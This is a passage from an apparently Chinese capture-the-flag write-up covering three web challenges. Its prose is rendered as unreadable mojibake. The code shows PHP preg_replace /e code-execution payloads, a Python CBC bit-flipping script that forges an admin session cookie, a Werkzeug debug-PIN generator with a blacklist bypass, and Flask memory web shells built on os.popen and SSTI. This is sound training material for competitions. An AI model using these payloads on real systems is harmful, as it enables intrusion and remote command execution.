class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>ä¸‰ç§è§£æ³•ï¼Œç¬¬ä¸€ç§å°±æ˜¯æ— å‚RCEï¼Œç¬¬äºŒç§å°±æ˜¯æ­£å¸¸å‘½ä»¤æ‰§è¡Œ(é€šè¿‡)</p><p>1.åˆ©ç”¨<code>(scandir(&quot;/&quot;))</code>åˆ—å‡ºæŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ï¼Œç„¶å<code>var_dump</code>æ‰“å°å‡ºæ¥ï¼š</p><p><code>flag=please_GIVE_me_flag&amp;task=var_dump(scandir(&quot;/&quot;))</code></p><p><img src="/img/hnctf1.png" alt="hnctf1"></p><p>2.çœ‹ä¸‹è¯·æ±‚å¤´æ˜¯æŒ‰ä»€ä¹ˆé¡ºåºï¼š</p><p><code>flag=please_GIVE_me_flag&amp;task=print_r(getallheaders())</code></p><p><img src="/img/hnctf2.png" alt="hnctf2"></p><p>è¿™é‡Œä»¥<code>Host</code>å’Œ<code>User-Agent</code>å¼€å¤´ï¼Œ<code>Host</code>ä¸èƒ½æ”¹ï¼Œæ‰€ä»¥ï¼šæŠŠUAå¤´æ”¹æˆ<code>/flag</code>ç„¶å<code>highlight_file(next(getallheaders()))</code>ç›´æ¥è¾“å‡º<code>/flag</code>çš„å†…å®¹ï¼š</p><p><img src="/img/hnctf3.png" alt="hnctf3"></p><p>æˆ–è€…ç›´æ¥åŠ ä¸ª<code>flag:/flag</code>å¤´åˆ°æœ€å¼€å§‹ç„¶å<code>highlight_file((pos(getallheaders())));</code>è¿™ä¸ª<code>pos</code>å°±æ˜¯å–ç¬¬ä¸€ä¸ªå¤´ã€‚</p><p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯åå…­è¿›åˆ¶ç›´æ¥ç»•è¿‡å…³é”®å­—æ£€æµ‹ï¼š</p><p><code>print(file_get_contents(&quot;\x2f\x66\x6c\x61\x67&quot;))</code>æˆ–è€…<code>highlight_file(&quot;\x2f\x66\x6c\x61\x67&quot;)</code></p><p>ç¬¬ä¸‰ç§å°±å®˜æ–¹ç”¨çš„é‚£ä¸ª<code>array_map()</code>å‡½æ•°</p><p><code>task=array_map($_POST[&#39;a&#39;],$_POST[&#39;b&#39;])&amp;flag=please_give_me_flaG&amp;a=system&amp;b[]=ls</code></p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>ç»™äº†<code>session</code>çš„åŠ è§£å¯†ç®—æ³•(AESï¼Œå·¥ä½œåœ¨CBCï¼Œ<code>iv</code>å’Œ<code>key</code>å®Œå…¨éšæœº)ã€‚é¦–å…ˆè¦è§£å†³çš„é—®é¢˜å°±æ˜¯å¦‚ä½•è¿›è¡Œ<code>session</code>çš„ä¼ªé€ ä½¿å¾—æˆ‘ä»¬çš„<code>session</code>ä¼ è¿‡å»è¢«è§£å¯†å<code>admin</code>å­—æ®µçš„å€¼ä¸º<code>1</code></p><p><a href="https://goodapple.top/archives/217">å‚è€ƒæ–‡ç« </a>ï¼ŒCBCå­—èŠ‚åè½¬æ”»å‡»ï¼š</p><p>ç®€å•è¯´å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ä¸Šä¸€ç»„å¯¹åº”ä½ç½®çš„å¯†æ–‡å®ç°ä¿®æ”¹å½“å‰ç»„å¯¹åº”ä½ç½®çš„æ˜æ–‡ï¼š</p><p><img src="/img/hnctf12.png" alt="hnctf12"></p><p>æŠŠè¿™ä¸œè¥¿å¥—è¿›é¢˜é‡Œï¼šå…¶å®<code>A</code>å°±æ˜¯åˆå§‹å‘é‡<code>iv</code>å¯¹åº”ä½ç½®çš„å¯†æ–‡ï¼Œå¯¹è¿™ä¸ª(ä¸Šä¸€ç»„çš„)å¯†æ–‡è¦æ€ä¹ˆè¿›è¡Œå¤„ç†å‘¢ï¼ŸæŠŠå®ƒå’ŒåŸæœ‰çš„æ˜æ–‡å¼‚æˆ–ï¼Œå†å’Œæˆ‘ä»¬ç›®æ ‡æ˜æ–‡å€¼å¼‚æˆ–ã€‚è¿™æ—¶(ä¸‹ä¸€ç»„)å¯¹åº”ä½ç½®çš„è§£å¯†è¿‡ç¨‹å°±æˆäº†æœ€åä¸€ä¸ªå¼å­ï¼Œè¾¾åˆ°äº†åœ¨ä¸çŸ¥å¯†é’¥çš„æƒ…å†µä¸‹ä¿®æ”¹å¯†æ–‡çš„ç›®çš„ã€‚</p><p><code>iv</code>è¿™ä¸ªåˆå§‹å‘é‡æ²¡åŠ å¯†ï¼Œç›´æ¥åœ¨å®ƒè¿™é‡Œä¿®æ”¹ã€‚å¯¹äº<code>&#123;&quot;admin&quot;:0&#125;</code>é‡Œ<code>0</code>è¿™ä½åœ¨ç¬¬11ä½ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># å¯¼å…¥ requests åº“ï¼Œç”¨äºå‘é€ HTTP è¯·æ±‚</span><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode  <span class="hljs-comment"># å¯¼å…¥ base64 åº“ï¼Œç”¨äºå¯¹ Base64 ç¼–ç è¿›è¡Œè§£ç å’Œç¼–ç </span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes  <span class="hljs-comment"># å¯¼å…¥ Crypto åº“ä¸­çš„ Util æ¨¡å—çš„ number å­æ¨¡å—ï¼Œç”¨äºå°†é•¿æ•´æ•°è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span><br><br><span class="hljs-comment"># å‘é€åˆå§‹è¯·æ±‚ä»¥è·å– session cookie</span><br>url = <span class="hljs-string">&quot;http://hnctf.imxbt.cn:41219/&quot;</span>  <span class="hljs-comment"># è®¾ç½®ç›®æ ‡ç½‘å€</span><br>response = requests.get(url)  <span class="hljs-comment"># å‘é€ GET è¯·æ±‚åˆ°ç›®æ ‡ç½‘å€ï¼Œå¹¶è·å–å“åº”å¯¹è±¡</span><br>original = <span class="hljs-string">b&#x27;&#123;&quot;admin&quot;: 0&#125;&#x27;</span>  <span class="hljs-comment"># å®šä¹‰åŸå§‹ä¼šè¯å†…å®¹ï¼Œè¿™é‡Œåªä¿ç•™äº† admin=0</span><br>revised = <span class="hljs-string">b&#x27;&#123;&quot;admin&quot;: 1&#125;&#x27;</span>  <span class="hljs-comment"># å®šä¹‰ä¿®æ”¹åçš„ä¼šè¯å†…å®¹ï¼Œå°† admin=0 æ”¹ä¸º admin=1</span><br><br><span class="hljs-comment"># ä»å“åº”å¤´ä¸­è·å– session cookie å€¼</span><br>session_cookie = response.cookies.get(<span class="hljs-string">&quot;session&quot;</span>)  <span class="hljs-comment"># ä»å“åº”çš„ cookies ä¸­è·å–åä¸º &quot;session&quot; çš„ä¼šè¯ cookie</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Session cookie: <span class="hljs-subst">&#123;session_cookie&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># è§£ç  session cookieï¼Œåˆ†ç¦» IV å’Œå¯†æ–‡</span><br>session = b64decode(session_cookie)  <span class="hljs-comment"># å¯¹ session_cookie è¿›è¡Œ Base64 è§£ç ï¼Œå¾—åˆ°åŸå§‹å­—èŠ‚ä¸²</span><br>iv = session[:<span class="hljs-number">16</span>]  <span class="hljs-comment"># è·å– IVï¼ˆInitialization Vectorï¼‰ï¼Œå‰16å­—èŠ‚ä¸º IV</span><br>cipher = session[<span class="hljs-number">16</span>:]  <span class="hljs-comment"># è·å–å¯†æ–‡ï¼Œä»ç¬¬16å­—èŠ‚å¼€å§‹åˆ°ç»“å°¾ä¸ºå¯†æ–‡éƒ¨åˆ†</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;iv = &#125;</span>&quot;</span>)  <span class="hljs-comment"># æ‰“å° IV çš„å€¼</span><br>newb = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>) ^ <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>) ^ iv[<span class="hljs-number">10</span>]  <span class="hljs-comment"># è®¡ç®—å°†åŸå§‹å€¼ &#x27;0&#x27; æ”¹ä¸º &#x27;1&#x27; åçš„æ–° IV çš„ç¬¬11ä½</span><br>orib = iv[<span class="hljs-number">11</span>]  <span class="hljs-comment"># è·å–åŸå§‹ IV çš„ç¬¬11ä½</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;orib = &#125;</span>&quot;</span>)  <span class="hljs-comment"># æ‰“å°åŸå§‹ IV çš„ç¬¬11ä½</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;newb = &#125;</span>&quot;</span>)  <span class="hljs-comment"># æ‰“å°æ–° IV çš„ç¬¬11ä½</span><br>new_iv = iv[:<span class="hljs-number">10</span>] + long_to_bytes(newb) + iv[<span class="hljs-number">11</span>:]  <span class="hljs-comment"># æ„é€ æ–°çš„ IVï¼Œåªéœ€ä¿®æ”¹ç¬¬11ä½</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;new_iv = &#125;</span>&quot;</span>)  <span class="hljs-comment"># æ‰“å°æ–° IV çš„å€¼</span><br>new_sess = b64encode(new_iv + cipher)  <span class="hljs-comment"># å°†æ–°çš„ IV å’ŒåŸå§‹å¯†æ–‡æ‹¼æ¥åè¿›è¡Œ Base64 ç¼–ç ï¼Œå¾—åˆ°æ–°çš„ä¼šè¯ cookie</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;new_sess = &#125;</span>&quot;</span>)  <span class="hljs-comment"># æ‰“å°æ–°çš„ä¼šè¯ cookie</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿæœ‰åˆ«çš„ä¿®æ”¹æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>url = <span class="hljs-string">&quot;http://localhost:8000/&quot;</span><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;guest&quot;&#125;&#x27;</span><br>res = requests.get(url)<br>c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">&quot;session&quot;</span>]))<br>c[default_session.index(<span class="hljs-string">&quot;0&quot;</span>)] ^= <span class="hljs-number">1</span><br>evil = b64encode(c).decode()<br>res = requests.get(url, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: evil&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç®—<code>Pin</code>ç ï¼Œè¿™é‡Œè¿›æ§åˆ¶å°æœ‰ä¸¤ç§æ–¹æ³•ï¼Œè¦ä¹ˆ<code>/read</code>è·¯ç”±ç›´æ¥å•¥ä¹Ÿä¸åŠ å°±ä¼šæŠ¥é”™ï¼Œè¦ä¹ˆç›´æ¥<code>/console</code>ï¼Œæˆ‘è¿™é‡Œç”¨ç¬¬ä¸€ç§æ–¹æ³•ï¼š</p><p><a href="https://xz.aliyun.com/t/8092">å‚è€ƒæ–‡ç« </a></p><p><img src="/img/hnctf8.png" alt="hnctf8"></p><p><code>username</code>è·å–ï¼Œè¦ä¹ˆ<code>root</code>è¦ä¹ˆ<code>ctfUser</code></p><p><img src="/img/hnctf9.png" alt="hnctf9"></p><p><code>modname</code> ä¸€èˆ¬é»˜è®¤<code>flask.app</code></p><p><code>flaskä¸‹app.pyçš„ç»å¯¹è·¯å¾„</code>ï¼š<code>/usr/lib/python3.9/site-packages/flask/app.py</code></p><p><code>str(uuid.getnode()) MACåœ°å€</code> è¯»å–è¿™ä¸¤ä¸ªåœ°å€ï¼š<code>/sys/class/net/eth0/address æˆ–è€… /sys/class/net/ens33/address</code>ï¼Œè¿™é¢˜ç”¨çš„ç¬¬ä¸€ä¸ªï¼š</p><p><img src="/img/hnctf10.png" alt="hnctf10"></p><p><code>02:42:ac:11:00:03</code></p><p><code>machine-id</code>ï¼šæ‹¼æ¥<code>/proc/sys/kernel/random/boot_id</code>å’Œ<code>/proc/self/cgroup</code>ï¼Œä½†é»‘åå•è¿‡æ»¤äº†<code>self</code>å’Œ<code>cgroup</code>ã€‚</p><p><a href="https://blog.csdn.net/weixin_63231007/article/details/131659892">ç»•è¿‡å‚è€ƒ</a>ï¼Œæ‰€ä»¥æ¢æˆæ¢æˆ<code>/proc/1/cpuset</code></p><p>åé¢å°±ç›´æ¥æŠ„å…¶å®ƒå¸ˆå‚…çš„è„šæœ¬äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctfUser&#x27;</span>,  <span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># é»˜è®¤å€¼</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># é»˜è®¤å€¼</span><br>    <span class="hljs-string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># æŠ¥é”™å¾—åˆ°</span><br>]<br><br>private_bits = [<br>    <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;22:32:4d:a2:8c:5c&quot;</span>.replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), <span class="hljs-number">16</span>)), <br>    <span class="hljs-comment">#&#x27;81843421246614&#x27;,#/sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span><br><span class="hljs-comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id</span><br><span class="hljs-comment">#2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="hljs-comment"># 1. dockerä¸‹ä¸ç”¨è¯»</span><br><span class="hljs-comment"># 2. dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f</span><br><span class="hljs-comment"># 3. æ— æƒé™ --&gt; banäº†selfå’Œcgroup, æ¢æˆ/proc/1/cpuset</span><br><span class="hljs-string">&#x27;dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f94024dd3686b6d6b6c42ca63810be24f999a5df85001add714e07927237cf525&#x27;</span><br><span class="hljs-comment">#/proc/self/cgroup</span><br><br><br>h = hashlib.sha1()<br><br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>    h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br></code></pre></td></tr></table></figure><p>æœ€åæ³¨æ„<code>flag</code>åªæœ‰<code>root</code>èƒ½è¯»ï¼Œå»ç¿»ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&quot;env&quot;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p><img src="/img/hnctf5.png" alt="hnctf5"></p><p>åªèƒ½è¿›è¡Œä¸€æ¬¡å‘½ä»¤æ‰§è¡Œä¸”æ— å›æ˜¾&#x2F;éƒ¨åˆ†å‘½ä»¤æ²¡æƒé™ï¼Œç›´æ¥æ‰“ä¸ªå†…å­˜é©¬è¿›å»ï¼š</p><p><a href="https://xz.aliyun.com/t/10933?time__1311=mq+xB70QD=9xlxGgrDyiDcDjEKTr5DOneD&alichlgref=https://www.google.com/">pythonå†…å­˜é©¬åˆ†æ</a></p><p><code>app.add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda:__import__(&#39;os&#39;).popen(&quot;cat /flag&quot;).read())</code></p><p><img src="/img/hnctf4.png" alt="hnctf4"></p><p>æ”¾ä¸ªå‚æ•°ä¹Ÿè¡Œï¼š</p><p><code>app.add_url_rule(&#39;/test&#39;,&#39;test&#39;,lambda:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())</code>ï¼Œç„¶å<code>cmd</code>æ‰§è¡Œå‘½ä»¤</p><p>æˆ–è€…ç±»ä¼¼<code>SSTI</code>è¿™ç§å½¢å¼ï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">cmd=render_template_string(&quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\<span class="hljs-name">&quot;app.add_url_rule(&#x27;/get&#x27;, &#x27;myshell&#x27;, lambda 